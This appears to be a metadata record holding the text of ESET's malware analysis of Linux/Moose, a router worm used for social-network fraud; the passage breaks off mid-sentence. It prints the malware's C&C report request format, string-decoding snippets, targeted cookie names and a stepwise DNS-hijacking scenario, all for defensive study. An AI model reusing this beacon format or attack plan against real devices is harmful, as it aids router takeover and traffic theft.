{
    "id": "44b39450-28f3-4a19-bec2-e62a695e026c",
    "created_at": "2022-10-25T16:48:19.608141Z",
    "updated_at": "2025-03-27T02:13:50.588953Z",
    "deleted_at": null,
    "sha1_hash": "198195bf91a009bdf666d630230d86b7b1d60bb9",
    "title": "Dissecting Linux/Moose: The Analysis Of A Linux Router-Based Worm Hungry For Social Networks",
    "authors": "ESET",
    "file_creation_date": "2015-05-19T12:52:16Z",
    "file_modification_date": "2015-05-19T12:52:22Z",
    "file_size": 4616213,
    "plain_text": "# Dissecting Linux/Moose\n\n###### The Analysis of a Linux Router-based Worm\n Hungry for Social Networks\n\n## Olivier Bilodeau\n & Thomas Dupuy\n\nMay 2015\n\n\n-----\n\n# Dissecting Linux/Moose\n\n###### The Analysis of a Linux Router-based Worm\n Hungry for Social Networks\n\n## Olivier Bilodeau\n & Thomas Dupuy\n\nMay 2015\n\n\n-----\n\n##### TABLE OF CONTENT\n\n**1. Executive Summary** 4\n\n**2. Hunting Season**\n\nIntroduction 5\n\n**3. Moose’s Behavior**\n\nan Overview 6\n\n**4. Moose Herding**\n\nThe Operation 8\n\n4.1. Moose population — Prevalence 11\n\n4.2. Moose habitat— Targeted devices 14\n\n4.3. Moose Motivation — Why Social Networks? 14\n\n4.4. Moose Taking Selfies — Deep into Instagram 15\n\n4.5. Multiple trails in the Moose yard — Alternative Attack Scenarios 19\n\n**5. Moose DNA**\n\nMalware Analysis 21\n\n5.1. Moose Reproduction — Infection Vector 23\n\n5.2. Going Deep in the Tundra — Spreading Past Firewalls 32\n\n5.2. Moose Crossing — Proxy Service 37\n\n5.4. Moose’s Sense of Smell — Sniffing Capabilites 42\n\n5.5. Competitive Moose — Cleaning other Malware 44\n\n5.6. Moose Communication — Configuration C&C Server Protocol 45\n\n5.7. Evolution of the Species —Malware changelog 50\n\n**6. Conclusion** 51\n\n**Appendix A: Malware samples** 52\n\n**Appendix B: Indicators of Compromise (IOCs)** 53\n\nNetwork-based Indicators 53\n\nHost-based Indicators 53\n\nDetection (yara) 54\n\n**Appendix C: Cleaning** 55\n\n**Appendix D: Prevention** 56\n\n**Appendix E: Potentially targeted vendors** 57\n\n\n-----\n\n##### LIST OF TABLE\n\nTable 1. Report Telnet login protocol 25\n\nTable 2. Reply to Telnet login report 26\n\nTable 3. Report shell access protocol 28\n\nTable 4. Report shell access response 28\n\nTable 5. Partial List of Moose's Configuration Flags 30\n\nTable 6. Moose Configuration Values Affecting the Behavior of the NAT Traversal 34\n\nTable 7. Moose relay C&C server response 34\n\nTable 8. Moose NAT traversal supported commands 35\n\nTable 9. Proxy Server Worker Commands 38\n\nTable 10. Report sniffed packet 43\n\nTable 11. Response to a report sniffed packet 43\n\nTable 12. Moose requests to configuration C&C server 45\n\nTable 13. Moose configuration C&C server response 46\n\nTable 14. Moose header configuration C&C server response 46\n\nTable 15. Moose whitelist item 47\n\nTable 16. Moose sniffer configuration item 48\n\nTable 17. Malware Samples 52\n\n##### LIST OF FIGURES\n\nFigure 1 Linux/Moose overview 7\n\nFigure 2 Proxy Traffic per Destination Port 8\n\nFigure 4 HTTPS Destination Analysis 10\n\nFigure 5 Proxy activity categorized by destination type 11\n\nFigure 6 Port 10073 Activity 12\n\nFigure 7 Scanning behavior over 24 hours 13\n\nFigure 8 Instagram Proxied HTTP Traffic 16\n\nFigure 9 Moose Components 21\n\nFigure 10 Moose Scanner Behavior 24\n\nFigure 11 Reporting a Peer Found to the Configuration C&C Server 24\n\nFigure 12 Report Telnet login example 26\n\nFigure 13 Moose Infection Mechanism 26\n\nFigure 14 Scan from the Internet or near home 32\n\nFigure 15 Netmask check 33\n\nFigure 16 Loopback check 33\n\nFigure 17 NAT traversal tunnel in action 36\n\nFigure 18 Moose Whitelist Validation Assembly 37\n\nFigure 19 Example of a SOCKS 4 tunnel 39\n\nFigure 20 Looking for CONNECT method 40\n\nFigure 21 Sniffing Network Traffic 42\n\nFigure 22 Capture of a Configuration Exchange with C&C 45\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### 1. EXECUTIVE SUMMARY\n\nLinux/Moose is a malware family that primarily targets Linux-based consumer routers but that can\ninfect other Linux-based embedded systems in its path. The compromised devices are used to steal\nunencrypted network traffic and offer proxying services to the botnet operator. In practice, these\ncapabilities are used to steal HTTP Cookies on popular social network sites and perform fraudulent\nactions such as non-legitimate \"follows\", \"views\" and \"likes\" on such sites.\n\nLinux/Moose is a standard statically-linked ELF binary that was stripped of any debugging symbols.\nIt relies heavily on multithreading for its operation using as many as 36 threads. Most of these\nthreads are used to attempt find and infect other devices automatically.\n\nThe threat displays out-of-the-ordinary network penetration capabilities compared to other\nrouter-based malware. Moose also has DNS hijacking capabilities and will kill the processes of other\nmalware families competing for the limited resources offered by the infected embedded system.\n\nESET researchers ran and monitored a Moose-infected environment and collected operational\ninformation about the threat. This information includes which social networks were targeted\nand the unencrypted interactions between the operators, the infected host and the targeted\nsocial networks.\n\nLinux/Moose does not have a persistence mechanism and does not provide a generic backdoor\nshell access to the botnet operator. No vulnerability is exploited at any time during its operation;\nit spreads by finding routers with weak credentials.\n\nThis report contains an overview of the operation and an in-depth analysis of the threat, details\nof its network protocol, indicators of compromise (IoC), cleaning instructions, prevention advice\nand the list of potentially targeted vendors.\n\n###### Key findings\n\n- Linux/Moose targets consumer routers and modems including the hardware provided\n\nby Internet Service Providers (ISPs) to consumers\n\n- The threat is built for deep network penetration spreading past firewalls\n\n- It can eavesdrop on communications to and from devices connected behind the infected\n\nrouter, including desktops, laptops and mobile phones\n\n- Moose runs a comprehensive proxy service (SOCKS and HTTP) that can be accessed only\n\nby a specific list of IP addresses\n\n- The operators use the infected devices to perform social network fraud on Twitter,\n\nFacebook, Instagram, Youtube and more\n\n- Moose can be configured to reroute router DNS traffic, which enables man-in-the-middle\n\nattacks from across the Internet\n\n- It affects Linux-based embedded devices running on the MIPS and ARM architectures\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### 2. HUNTING SEASON\n\n Introduction\n\nAt ESET we like to investigate exotic threats. Whether they run on atypical architectures like MIPS\nor ARM, or they target embedded networked devices — like consumer routers or Internet of Things\n(IoT) devices — instead of desktops or phones or they are designed to obscure their end goal, these\nthreats arouse our curiosity. There are other reasons, of course, for a threat to be considered exotic\nbut, the threat under study here fits all the above categories. In fact, the only thing that’s\nnot exotic about it is the name we’ve given it: Linux/Moose[1]. Well, at least for those of us\nat ESET Canada Research.\n\nThis report is divided into two sections: a description of what we know about the operation, followed\nby a detailed technical description of the threat. Before going in too deep into the operation, though,\nwe need to give you a high-level sense of what Moose can do.\n\n1 For the curious: the original malware binary filename as installed on the router is elan2. Élan is French\nfor Moose.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### 3. MOOSE’S BEHAVIOR\n\n an Overview\n\nThe high-level capabilities of this worm are:\n\n- Replicate on the Internet and by way of any LAN interfaces behind firewalls\n\n- Service listening on port 10073 that allows specific IP addresses to proxy through the infected\n\ndevice. HTTP/HTTPS and SOCKS proxying\n\n- Tunnel traffic from a relay C&C server to other hosts (effectively circumventing NAT\n\nprotections)\n\n- Eavesdrop on network communications and send some of the captured traffic to a report\n\nC&C server\n\n- Periodically kill processes launched by competing embedded malware\n\nInterestingly, missing from this list is the persistence mechanism (there isn’t any) and the fact\nthat no generic backdoor shell access is made available to the botnet operator.\n\nLast but not least, this threat spreads only by compromising systems with weak or default\ncredentials. No vulnerabilities are exploited by the malware. Although downplayed by system\n[administrators, this attack vector has been effective at compromising a lot of Internet-connected](http://www.welivesecurity.com/2014/03/18/operation-windigo-the-vivisection-of-a-large-linux-server-side-credential-stealing-malware-campaign/)\n[systems. As FireEye recently stated: “Brute forcing credentials remains one of the top 10 most](http://www.welivesecurity.com/2014/03/18/operation-windigo-the-vivisection-of-a-large-linux-server-side-credential-stealing-malware-campaign/)\ncommon ways an organization is first breached.”\n\nAs we have found out, the malware’s main payload — its generic proxy service — is used solely\nto perform social network fraud. The story is similar for stolen traffic which targets browser cookies.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nWith that understanding we summarize the threat graphically below:\n\nOperator\n\nStolen\nbrowser\ncookies\n\nInternet\n\nVictim\n\n[...]\n\nScanning all networks\nfor devices to infect\n\nOther routers **_DVR_**\n\nSocial network fraud\n\nFigure 1 Linux/Moose overview\n\nLinux/Moose will periodically communicate with a set of command and control servers (C&C)\nthat are hardcoded into the malware itself. The randomly picked C&C server, henceforth\nthe configuration C&C server, will provide configuration information that will affect the behavior\nof the malware. In that configuration two IP addresses will be referred to several times in this report:\nthe IP address of the C&C server to use for reporting and infection, dubbed the report C&C server,\nand the IP address of the C&C server to use for relay (NAT traversal), dubbed the relay C&C server.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### 4. MOOSE HERDING\n\n The Operation\n\nWhen looking at the broad possibilities of this malware it is not immediately obvious what\nits exact purpose is. It could go in many directions, from DDoS, to compromise of networks,\nand expose private servers to the operator (via proxy), steal important yet unencrypted traffic,\n[or perform man-in-the-middle attacks via DNS hijacking.](http://www.welivesecurity.com/2014/04/02/win32sality-newest-component-a-routers-primary-dns-changer-named-win32rbrute/)\n\nIt was not until we were able to decrypt our first configuration from the configuration C&C server\nthat we were able to start to grasp what the operators were after. When we started running our own\ninfected devices then the purpose became crystal clear.\n\nThis threat is all about social network fraud.\n\nFirst, analysis of the configuration indicated that the data that the bot is trying to steal\n[is HTTP cookies from popular social networks.](http://en.wikipedia.org/wiki/HTTP_cookie)\n\n- Twitter: twll, twid\n\n- Facebook: c_user\n\n- Instagram: ds_user_id\n\n- Google: SAPISID, APISID\n\n- Google Play / Android: LAY_ACTIVE_ACCOUNT\n\n- Youtube: LOGIN_INFO\n\nAdditionally, by monitoring one infected router — which we firewalled in order to prevent it from\ninfecting others — we were able to establish the nature of the traffic proxied through these routers.\n\nWe collected this proxy data for almost a month in the spring of 2015.\n\n#### 4%\n**Operator (HTTP)**\n\n#### 0%\n**Others**\n\n#### 18%\n**HTTP**\n\n#### 77.64%\n**HTTPS**\n\nFigure 2 Proxy Traffic per Destination Port\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nWhat is highlighted here is that most of the traffic going through the proxy is encrypted. The operator\ntraffic is carried via HTTP over a non-standard port (TCP 2318). It is used to communicate the external\nIP address of the infected device to the client at the other end of the proxy. It is worth noting that most\nof the HTTP traffic is for the Instagram social network and is upgraded to HTTPS right away using\na Location: header.\n\nFigure 3 Instagram server upgrades client connection to HTTPS using\na Location header\n\nThe SOCKS proxy overhead (1) and the redirection to use HTTPS instead of HTTP (2) can be seen\nin the capture.\n\nAlthough we can’t see the content of the encrypted traffic, we can look at the destination\nIP address. Furthermore, we can inspect the certificate identifying the server and its Common\nName (CN) — a mandatory attribute that allows to authenticate the website — giving us an accurate\ndescription of the destination of the proxied traffic.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nFigure 4 HTTPS Destination Analysis\n\nDuring our monitoring, the top 3 targets were Twitter, Instagram and Soundcloud. We regrouped\nthe \"Others\" in a separate pie chart to make the graph readable.\n\nIn addition to the encrypted data, we looked at the autonomous systems (AS) where the proxied\ntraffic was going and cross-referenced it with passive DNS information. Using this method we were\nable to compile the list of targeted organizations below:\n\n- Fotki (Yandex)\n\n- Instagram (Facebook)\n\n- Live (Microsoft)\n\n- Soundcloud\n\n- Twitter\n\n- Vine\n\n- Yahoo\n\n- Youtube (Google)\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nWe can also look at how much requests are made through the proxy and for what purpose was\nthe proxy used. This is summarized in the below graph.\n\nFigure 5 Proxy activity categorized by destination type\n\nSocial networks is the number of proxy requests with a destination related to social networking\nsites as identified by the certifacate CN, passive DNS information or the IP address AS. botnet traffic\nis the number of proxy requests sent to C&C and was always related to the previously mentioned\nTCP port 2318. Other is any proxy request that didn’t fit the above categories. The graph highlights\nthat infected hosts are leveraged only to access social networks and that, on average, more than\n500 requests per day will go through an infected router.\n\nUnfortunately, since most of the traffic is encrypted, we can only speculate about what they are\ndoing, even though we can make a shrewd guess. We will get to that eventually but first lets look\nat how big this threat is.\n\n###### 4.1. Moose population — Prevalence\n\nDespite all our efforts we were unable to make a reliable estimate of the number of affected routers.\nThis is due in part to the fact that the malware was built to make it hard to make an estimate. There\nis no peer-to-peer protocol, it uses a hardcoded IP address instead of DNS for C&C, and even though\nthe backdoor is listening on the Internet on port 10073 to offer its proxy service, only IP addresses in\na whitelist are allowed to connect. Another reason for our lack of success is the lack of security tools\necosystems (like Anti-Virus) on embedded systems. Finally, the hosting providers where the C&C are\nlocated were relunctant to cooperate, which didn’t help.\n\nThis section will list all other attempts we have made at estimating the population of this malware.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### Probes on the Internet\n\nSomething we can use to give us a sense of the activity level of this threat is the general network\n[activity on the Internet Storm Center’s probes regarding port 10073. Since this port is unassigned](https://isc.sans.edu/port.html)\n[by the IANA, and is not in use by any popular software, abnormally high volumes of traffic](http://www.speedguide.net/port.php%3Fport%3D10073)\non that port could be an indicator of Moose activity.\n\n###### Port 10073 Activity\n\nFigure 6 Port 10073 Activity\n\nAlthough we couldn’t find precise documentation, we believe that sources and targets\nrepresent whether the packet seen on the ISC’s probe going for port 10073 was from the source\nside or the target side of the probe. In themselves the numbers might paint an incomplete picture,\n[since the probes are seeing just a subset of the Internet traffic — but if we compare them with HTTPS](https://isc.incidents.org/port.html%3Fstartdate%3D2014-01-01%26enddate%3D2015-05-13%26port%3D443%26yname%3Dsources%26y2name%3Dtargets)\n[traffic over the same period, we see that Moose activity was roughly only an order of magnitude](https://isc.incidents.org/port.html%3Fstartdate%3D2014-01-01%26enddate%3D2015-05-13%26port%3D443%26yname%3Dsources%26y2name%3Dtargets)\nbelow HTTPS.\n\nWe can also see a clear rise in 2014 that is too sharp to be statistically irrelevant. We first met Linux/\nMoose in late July 2014. Since the beginning of 2015 there seems to be a decline in activity but we\nknow that the operators are still active since they keep updating their malware. The fact that they\ncan remotely control the intensity of scanning activity on port 10073 might account for the apparent\ndecline in traffic.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### Moose Aggressiveness\n\nAnother measure of prevalence is the aggressiveness with which the bot spreads. We ran one infected\nhost for 24 hours and measured its level of activity and its success rate at finding potential peers or\nconnecting to exposed Telnet services. Here are our results:\n\n\n**Telnet Hosts with**\n**Login Prompt**\n\n\n**180000**\n\n**135000**\n\n**90000**\n\n**45000**\n\n**0**\n\n\n**180**\n\n**135**\n\n**90**\n\n**45**\n\n**0**\n\n|10073 Connection Attempts Telnet Connection Attempts 10073 Responding Hosts Telnet Responding Hosts|Col2|Col3|\n|---|---|---|\n||||\n||||\n||||\n||||\n\n\nFigure 7 Scanning behavior over 24 hours\n\nOver 24 hours, almost 170000 connection attempts were made on port 10073, meant\nfor 23000 unique hosts. Of those, 36 completed the TCP handshake, which means that they might\nbe infected, or they have another service on this port[2], or they are firewalled weirdly[3]. 85000 Telnet\nconnection attempts were made on 18000 unique hosts, of which 161 responded with a login banner.\n\nThese numbers have to be taken with a grain of salt since they depend heavily on the type of hardware\non which the malware runs. We ran it under software emulation — which is usually way slower\nthan real hardware — in a virtualized Intel server — which is way more powerful than most routers.\nIn other words, we don’t know how these numbers compare to real infected hardware but we tend\nto think that they should be comparable.\n\n###### Internet scan\n\n[Finally, we asked our friends at Rapid7 to scan the Internet on both port 10073 and 23 (Telnet)](https://sonar.labs.rapid7.com/)\nin order to get a sense of how many Internet-facing devices listen to both ports. It turns out\nabout 1 million IP addresses fit that description. If we remove the devices that had no Telnet banner,\nthat number is reduced to around 50,000 potentially infected hosts. Still, this number is probably\nan overestimate because of the wild nature of the Internet and yet might also be an under estimate\nsince many publicly unreachable and therefore uncounted devices might be infected.\n\nAll of these indicators taken together, while only educated guesses, leads us to think that this threat\nis real and should be taken seriously.\n\n2 Although possible, we randomly inspected a sample of the servers and saw very few with actual responding\nservices on the 10073 port\n\n3 TCP FIN instead of RST or dropping the packets, which is usually the best practice\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### 4.2. Moose habitat— Targeted devices\n\n[Linux/Moose requires a Linux-based system because of its dependency on µClibc, a popular C library](http://www.uclibc.org/)\nfor embedded systems. Plenty of embedded systems are now running Linux — from consumer routers\nto carrier-grade network gear through Internet of Things (IoT) appliances.\n\nSome affected devices are easier to identify than others. For instance: upon launch, the malware\nchecks whether the file /home/hik/start.sh exists on disk. This path is usually associated with\n[Hik Vision DVRs which are being targeted by embedded malware. Another means of identification](http://www.hikvision.com/europe/Press-Release-details.asp%3Fid%3D2692)\nis to look at what routers support the methods used to perform DNS Hijacking. Last but not least is\nto look at what devices are affected by the threats that Linux/Moose tries to eliminate when it runs.\nHere is a list of vendors we know are being targeted:\n\n###### Vendors Confirmed as Being Affected\n\nActiontec, Hik Vision, Netgear, Synology, TP-Link, ZyXEL, Zhone\n\nIoT but even medical devices\n[Based on recent security research we have enough evidence to state that even](http://hextechsecurity.com/%3Fp%3D123)\nmedical devices like the Hospira Drug Infusion Pump could be infected with\nLinux/Moose. Of course, just as is the case with IoT, these devices are currently\nmore collateral damage than deliberate targeting.\n\nDue to time constraints and hardware availability, we have been unable to confirm so far\nthat certain vendors are definitely targeted. We would love to be able to crowdsource an accurate\ntargeted vendors list. See the full list of potentially targeted vendors in the appendixes for vendor\nnames and validation instructions.\n\nAs to why some of these devices would ever be attacked by the malware? Well, there is the malware’s\nability to reach behind firewalls but we must not forget what we have learned in 2012 via\n[the Carna Botnet:](http://en.wikipedia.org/wiki/Carna_botnet)\n\nA lot of devices and services we have seen during our research should never be connected\nto the public Internet at all. As a rule of thumb, if you believe that \"nobody would\nconnect that to the Internet, really nobody\", there are at least 1000 people who did.\nWhenever you think \"that shouldn’t be on the Internet but will probably be found a few\ntimes\" it’s there a few hundred thousand times. Like half a million printers, or a Million\nWebcams, or devices that have root as a root password.\n\n[— Internet Census 2012 (Carna botnet)](http://internetcensus2012.bitbucket.org/paper.html)\n\n###### 4.3. Moose Motivation — Why Social Networks?\n\nDuring our analysis we often asked ourselves, “Why so much effort in order to interact with social\n[networks?” Then we realized that there is a market for follows, likes, views and whatnot. It is pretty](http://www.webroot.com/blog/2013/12/11/cybercriminals-efficiently-violate-monetize-youtube-facebook-twitter-instagram-soundcloud-googles-tos/)\nclear that this is what is going on here.\n\nFirst, as previously mentioned, there are attempts at stealing cookies from these sites. However,\nthe cookies cannot be stolen if the traffic is HTTPS and now most of these sites are HTTPS-only,\nso it’s unclear how effective these attacks are in this respect.\n\nSecond, attempting to commit fraud upon these sites needs a reputable and disposable IP address.\nIf someone tries to register 2000 twitter accounts from his own IP address this will likely draw\nattention. To a social network site operator, there is probably nothing more reputable than\nan IP address behind a well-known ISP. Just the type of network where you can expect\nto find badly configured consumer routers.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### 4.4. Moose Taking Selfies — Deep into Instagram\n\nThe non-operator-related HTTP traffic we were able to observe was of the well-known Instagram\nsocial network.\n\nDuring our monitoring we were able to see more than 700 different Instagram accounts accessed\nfrom a single infected router over about a month.\n\nAccounts freshly created that we’ve seen in the tunnels:\n\nWhen we checked the next day, the account had started to follow around 30-40 people:\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nThis is no isolated case. Both these accounts were seen in the HTTP traffic and then a few hours\nlater when we checked them they were already following a similar number of accounts. It feels\nas if the operators understand there to be some threshold value that must not be reached too quickly.\n\nLooking more closely at one account, here is a Wireshark screenshot of the HTTP traffic. You can\nsee the username in the highlighted Location header [4].\n\nFigure 8 Instagram Proxied HTTP Traffic\n\nAfter a few hours we have a user with 36 followers:\n\n4 Sharp-eyed readers will also notice the server’s redirection to HTTPS ending our ability to monitor the\ncontent of the network traffic\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nWho is he following?\n\nWe picked an account at random. Carefully avoiding accounts with pictures that would require some\nblurring we’ve hit an account with surprisingly many followers considering that it has seven posts\nand follows only seven accounts:\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nAfter one week it got better:\n\nWe have also found accounts that are following many similar accounts:\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nLike this one selling Facebook likes:\n\nBy looking at the tunnel activity we were able to witness many instances of fraudulent social\nnetwork activity. It seems that people are willing to pay for this, so it is understandable that criminals\nwill try to leverage it.\n\n###### 4.5. Multiple trails in the Moose yard — Alternative Attack Scenarios\n\nLooking purely at the capabilities of Moose, several attack scenarios can be extrapolated. However\ndue to the complexity of monitoring this threat most of them couldn’t be confirmed. We will quickly\nexplore the more interesting ones here.\n\n###### Distributed Denial of Service (DDoS) attacks\n\nLike most botnets, DDoS capability is a possibility. In this case there is nothing built into the malware\nitself that is related to DDoS but the generic SOCKS proxy implementation allows it. However\nit doesn’t seem realistic to waste bandwidth through proxies instead of performing direct attacks.\n\n###### Network exploration\n\nTargeted network exploration and eavesdropping is definitely possible with Moose due to its\nNAT traversal capabilities and its integrated network sniffer, which is configured by a C&C server.\nThe operator could tweak and monitor more closely one infection based on the IP address\nof the infection if it were affiliated with a government or a bank, for instance.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### Reconnaissance then DNS Hijacking\n\nOne technical limitation of Moose is that it can only perform its DNS hijacking payload on victims' routers\nduring infection. However this is not enabled in the default C&C configuration[5] and so we wondered\nhow it could be used.\n\nHere is a credible attack that the operator could launch to leverage several pieces of Moose’s\nfunctionality and that would enable a reinfection of victims in which their DNS would get hijacked.\n\nNote This plan requires knowledge about the malware that hasn’t been covered yet.\nSome of the missing pieces will be explained further along.\n\n1. Infect a few network devices within close range, such as badly configured consumer routers\nbehind the same ISP\n\n2. Sniffer is activated and waits for HTTP Cookies\n\n3. Credible browsing activity occurs and operator receives all the cookies\n\n4. Once confirmed to be an interesting target, configuration from the C&C changes: testing\n\nfor infected host before going to Telnet is disabled, DNS hijacking is enabled and scanner\nthreads are rebalanced to favor the infection of closely related IP addresses instead\nof random ones\n\n5. Reinfection will happen as the scanner reinfect hosts already infected (due to the disabled\n\ncheck). During the reinfection the rogue DNS IP addresses will be put in place.\n\n6. Users behind compromised routers will have their DNS hijacked\n\n[At this point the rogue DNS servers can point legitimate sites to phishing sites, inject malware](https://github.com/secretsquirrel/BDFProxy)\n[in downloaded files, or perform man-in-the-middle attacks that would prevent upgrades to HTTPS](https://github.com/secretsquirrel/BDFProxy)\nby websites.\n\n5 Which is good for them since they don’t need to give out the malicious DNS IP address in the configuration\ninformation. Something we would have definitely explored if it were available.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n##### 5. MOOSE DNA\n\n Malware Analysis\n\nLinux/Moose is a statically linked ELF binary without debugging symbols. It uses µClibc as its C library.\nIt relies heavily on multithreading with more than 30 running simultaneously during a usual infection.\n\n```\n$ file elan2\nelan2: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked,\nstripped\n\n```\n\nWe based our analysis on the MIPS variants of the threat. The screen captures in this report are taken\nfrom this architecture. We quickly analyzed the ARM variant to make sure that this is the same threat\nand track changes through time, but that’s all.\n\nHere is a diagram of the various components of the threat that we will develop in the following sections.\n\naction\n\nRaw socket **C&C** Contact configurationC&C server\n\nthreads\n\nrecvfrom Eavesdrop network\n\nContact report Connect\nC&C server\n\nBruteforce\n\nPropagate LAN Propagate\n\nInfect Contact report\nC&C server\nContact report\nC&C server\n\nContact relay C&C server NAT travelsal\n\nConnect\n\nBruteforce\n\nPropagate WAN Propagate\n\nInfect Contact report\nC&C server\nContact report\n\nOne hour C&C server\n\nServer TCP: 10073\n\nNAT traversal Listen\n\nHTTP Proxy\n\nForward traffic Network I/O Verify whitelist Server worker thread SOCKS Proxy\n\nFigure 9 Moose Components\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### String obfuscation with C&C servers\n\nBefore we move on to describe the individual components, there is one thing that is common\nbetween many of the components: The obfuscation that is applied to the strings sent through\nthe network.\n\nStrings obfuscated with this simple algorithm can be made readable with the following Python snippet:\n\n```\ndef decrypt_cnc_msg(ct):\n \"\"\"\n Decrypt strings\n ct: bytearray of the ciphertext\n returns bytearray of the plaintext\n \"\"\"\n # seed\n k = 0xff\n for i in reversed(range(len(ct))):\n  # XOR with previous\n  k = ct[i] = ct[i] ^ k\n return ct\n\n```\n\n###### 5.1. Moose Reproduction — Infection Vector\n\nWe classified Moose as a worm since it attempts to replicate automatically. In this section we will\ndescribe how its spreading mechanism works.\n\n**Note** Several parameters provided by the server configuration packet are of interest\nto understand the spreading behavior. The parameter names have been made up\nbased on the behaviors they modified. The full list and details of these parameters\nis available in the configuration C&C network protocol section.\n\nAfter configuration, three sets of threads are created that are related to the spreading mechanism:\nthreads scanning random IP addresses, threads scanning closely related IP addresses, and threads\ncreated per network interface to scan these otherwise unreachable networks. These threads share\nthe same code, which we will refer to as a scanner thread. The scanner thread’s behavior is altered\nby being passed a different configuration.\n\nScanner threads and configuration\nInterestingly the number of threads per set is defined by the configuration\nC&C server. cnccfg_nb_thdscan_local defines how many threads should\nscan for IPs closely related to the external IP. cnccfg_nb_thdscan_ext defines how many threads should scan using random IPs. Lastly, if cnccfg_flag_\n```\nscanner_sniffer is set, then a scanner thread will be launched per addition\n```\nal network interface on the system — something we cover later.\n\nDuring the observation period, typical configuration values seen coming from the configuration\nC&C server were:\n\n- 10 threads scanning random IPs\n\n- 20 threads scanning closely-related IPs\n\n- 1 thread per network interface scanning local-area networks usually protected\n\nby the routers themselves\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### Scanner threads\n\nThe three sets of threads are each bootstrapped a bit differently. One set is scanning purely random\nIP addresses, another one is scanning for random IP addresses that are in the same /15 subnet (CIDR)\nas the external IP address of the infected device, and the last one is incrementally scanning all the IPs\non the network interfaces it found up to the interface’s broadcast address.\n\nRandom scan\n\nInternet\n\n13.3.3.7/15\n\nClosely-related IP addresses\n( random scan in the same /15 of\nthe router’s external IP address )\n\n13.3.3.7\n\n192.168.1.0/24\n\n10.13.3.0/24\n\nOther interfaces\n\n( linear scan from .0 to .255 )\n\nFigure 10 Moose Scanner Behavior\n\nThe scanner performs the following operations on each IP. First, it checks going to see if it can\nconnect on TCP port 10073. If it can perform a full TCP handshake, it will disconnect right away\nand considers that the host is already infected and will report it as such to the report C&C server.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\n###### A Moose Encounter — An Infected Host (Peer) was Found\n\nUnlike the other configuration C&C server interactions, which happen using a custom binary protocol\non port 81, this exchange is done in HTTP on that same port. Here is an example that was captured:\n\nFigure 11 Reporting a Peer Found to the Configuration C&C Server\n\nServer headers\nThe server headers here are interesting. This Apache server version hasn’t\nbeen released (and probably won’t be for another century). Furthermore, to the\nbest of our knowledge, Redhat has never been capitalized \"RedHat\" in Apache\nServer headers. These leads us to think that what we have here is a custom\nserver that is intended to behave like an HTTP server when sent anything that\n\nlooks like GET /xx/[6].\n\nThere are three fields of interest here. They are the fields set in the format string used by the malware:\n\n```\nGET /xx/rnde.php?p=%d&f=%d&m=%d HTTP/1.1\\r\\n\nHost: www.getcool.com\\r\\n\nConnection: Keep-Alive\\r\\n\n\\r\\n\n\n```\n\n**Note** The www.getcool.com hostname is unrelated and an attempt to mislead analysis.\n\nThe three decimal format placeholders (%d) depicted above are:\n\n- The obfuscated IP address\n\n- The endianness of the platform reporting (0 for big-endian and 1 for little-endian)\n\n- The type of scan that found the peer (0 for close-scan and 1 for Internet random scan)\n\n6 Which is also in the URL given on infection to download the malware\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nThe IP address is lightly obfuscated by being XORed with a fixed key and can be decrypted using\nthe following Python snippet (where p is the p parameter of the GET):\n\n```\nimport socket, struct\np = -1482289528\nprint(socket.inet_ntoa(struct.pack(\"i\", (p ^ 0x7890ABCD))))\n\n```\n\nBack to the scanner thread description: if there is no connection possible to TCP port 10073\n(no proper handshake) it tries to connect to the Telnet service of that IP (TCP port 23). It will attempt\nto bruteforce the login prompt (if any) with a username and password combination list it received\nfrom the configuration C&C server. On a successful guess, it will report the intrusion to the report\nC&C server, then attempt to get a command prompt on the device. Otherwise it will move on\nto the next IP address.\n\n###### The Moose is In — Telnet Access\n\nThe packet to report a successful connection has the following format:\n\n\nTable 1. Report Telnet login protocol\n\n\nName Size Description\n\nVersion Integer (4 bytes) Version of the malware\n\nMessage type Integer (4 bytes) Set to 14 meaning report successful Telnet login\n\nIP address Integer (4 bytes) IP address of the victim\n\nUnused 28 bytes Unused\n\n\nByte ordering\nUnless otherwise noted, all the network protocol’s Integers are stored\nin little-endian byte ordering, except for IP addresses, which are stored their\nnative network order (big-endian).\n\n\nFigure 12 Report Telnet login example\n\nThe reply from the server is the same packet with the version field repurposed.\n\n\n-----\n\n## Dissecting Linux/Moose\n\n\nTable 2. Reply to Telnet login report\n\n\nName Size Description\n\nHijack DNS Integer (4 bytes) If bit 1 is set to 1 and cnccfg_flag_hijackdns is set,\nthis instructs the malware to attempt to hijack the\nDNS servers of the victim. This is covered later.\n\nMessage type Integer (4 bytes) Set to 14 (sent back)\n\nIP address Integer (4 bytes) IP address of the victim (sent back)\n\nUnused 28 bytes Unused\n\n###### Infection mechanism\n\nAfter a successful Telnet login, the infection process will start. It can be roughly summarized with the\ndiagram and the steps below.\n\n###### C&C\n\nLinux/Moose infected\n\nReport C&C server Victim\n\nObfuscated Commmands\ncommands sent to victim 4\n\nvia telnet\n###### 2\n\n 1\n\nVictim info 3 Unscramble commands\n\nFigure 13 Moose Infection Mechanism\n\n- Using the Telnet connection, Moose will gather information on the victim\n\n- Victim information will be sent to the report C&C server using a binary protocol (1)\n\n- The Report C&C server will return obfuscated commands to the Moose infected router (2)\n\n- Moose will unscramble the commands (3) and send them to the victim through the Telnet\n\nconnection (4)\n\nThe commands are 